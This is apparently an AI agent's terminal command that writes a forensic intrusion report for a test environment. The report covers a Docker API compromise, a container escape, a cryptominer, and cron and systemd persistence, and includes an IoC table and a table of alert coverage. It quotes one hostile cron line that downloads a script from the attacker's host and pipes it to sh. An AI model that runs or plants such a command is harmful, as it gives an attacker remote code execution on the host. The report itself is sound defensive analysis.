Sending keys: ["cat <<'EOF' > /app/intrusion-report.md\n# DFIR Intrusion Report — Host `docker-prod-01`     \n\n## 1. Executive Summary\nAn external threat actor originating from IP `198.51.100.102` (`/sas/cti/advisory.txt:10`, `/disk/var/log/auth.log:222`) compromised the host `docker-prod-01` by exploiting an unauthenticated Docker Engine API exposed on `0.0.0.0:2375` (`/disk/etc/docker/daemon.json:116`). The attacker deployed a privileged container mounting the root filesystem, performed container escape to the host (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh:3`), dropped an `XMRig` cryptomining payload at `/opt/xmrig/xmrig` (`/disk/opt/xmrig/xmrig:3`), and installed multiple persistence mechanisms including cron (`/disk/etc/cron.d/docker-mon:5`) and a silent systemd service (`/disk/etc/systemd/system/docker-metrics.service:5`).\n\n## 2. Threat Entities & Indicators of Compromise (IoCs)\n\n| Entity Type | Value / Identifier | Source / Evidence Citation | Notes |\n|---|---|---|---|\n| Attacker IP | `198.51.100.102` | `/sas/cti/advisory.txt:10`, `/disk/var/log/auth.log:222`, `/disk/var/log/nginx/access.log:379` | Suspected origin IP, brute force & exploit source |\n| C2 Domain | `update-docker.example.cn` | `/sas/cti/advisory.txt:30`, `/disk/var/lib/.cache/.wiped.bin:1` | Command & control infrastructure |\n| C2 Beacon URL | `http://198.51.100.102/x` | `/disk/etc/cron.d/docker-mon:5` | Payload staging and re-drop script |\n| Mining Pool | `stratum+tcp://xmr.docker.evil:3333` | `/sas/cti/advisory.txt:31`, `/disk/opt/xmrig/xmrig:4` | Monero mining pool destination |\n| Wallet Address | `4A0000000000000000009e202e3a533f` | `/sas/cti/advisory.txt:32`, `/disk/opt/xmrig/xmrig:5` | Cryptomining reward wallet |\n\n## 3. Detailed Attack Chain & Technical Analysis\n\n### Step 1: Initial Access & External Remote Services (MITRE ATT&CK T1133)\nThe Docker Engine API on host `docker-prod-01` was bound to `0.0.0.0:2375` without TLS or authentication (`/disk/etc/docker/daemon.json:116`, `/sas/baseline.json:1`). This allowed unauthenticated remote access to manage containers directly over TCP.\n\n### Step 2: Container Deployment (MITRE ATT&CK T1610)\nThe attacker connected to port 2375 and deployed a container using an overridden entrypoint script (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh:3`).\n\n### Step 3: Container Escape (MITRE ATT&CK T1611)\nBy starting a privileged container with the host volume mounted (`/` mounted inside the container), the attacker executed commands on the underlying host, effectively escaping container isolation (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh:3`, `/disk/var/lib/.cache/.wiped.bin:1`).\n\n### Step 4: Execution & Resource Hijacking (MITRE ATT&CK T1496)\nThe attacker dropped and executed an XMRig cryptominer at `/opt/xmrig/xmrig` (`/disk/opt/xmrig/xmrig:3`). The process runs under PID 1337 and connects to pool `stratum+tcp://xmr.docker.evil:3333` (`/disk/opt/xmrig/xmrig:4`).\n\n### Step 5: Cron Persistence (MITRE ATT&CK T1053.003)\nThe attacker created `/etc/cron.d/docker-mon` (`/disk/etc/cron.d/docker-mon:5`) to periodically fetch and re-drop miner payloads via `curl http://198.51.100.102/x | sh`.\n\n### Step 6: Systemd Persistence — SILENT (MITRE ATT&CK T1543.002)\nThe attacker installed a systemd unit file at `/etc/systemd/system/docker-metrics.service` (`/disk/etc/systemd/system/docker-metrics.service:5`). Disguised under the service name `System Update Helper`, it executes a re-dropper script upon boot/service restart.\n\n### Step 7: Anti-Forensics & Wiping Residue (MITRE ATT&CK T1070)\nEvidence of log wiping and C2 communication was found in `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin:1`).\n\n## 4. Security Product (SAS) Alert Coverage Analysis\n\n| Artifact / Finding | MITRE ATT&CK | SAS Alert Status | Citation |\n|---|---|---|---|\n| Miner Binary `/opt/xmrig/xmrig` | T1496 | ALERTED (`ALERT-01`) | `/sas/alerts.json:1`, `/disk/opt/xmrig/xmrig:3` |\n| Cron Job `/etc/cron.d/docker-mon` | T1053.003 | ALERTED (`ALERT-02`) | `/sas/alerts.json:2`, `/disk/etc/cron.d/docker-mon:5` |\n| Docker Daemon Misconfiguration | T1133 | ALERTED (`ALERT-03` / `CHK-05`) | `/sas/alerts.json:3`, `/disk/etc/docker/daemon.json:116` |\n| Systemd Service `docker-metrics.service` | T1543.002 | **SILENT (Not Alerted)** | `/disk/etc/systemd/system/docker-metrics.service:5` |\n| Attacker Container Entrypoint Residue | T1610 / T1611 | **SILENT (Not Alerted)** | `/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh:3` |\n| Wiped Binary Cache / C2 Beacon Fragment | T1070 | **SILENT (Not Alerted)** | `/disk/var/lib/.cache/.wiped.bin:1` |\nEOF\n"] min_timeout_sec: 0.5 max_timeout_sec: 180.0
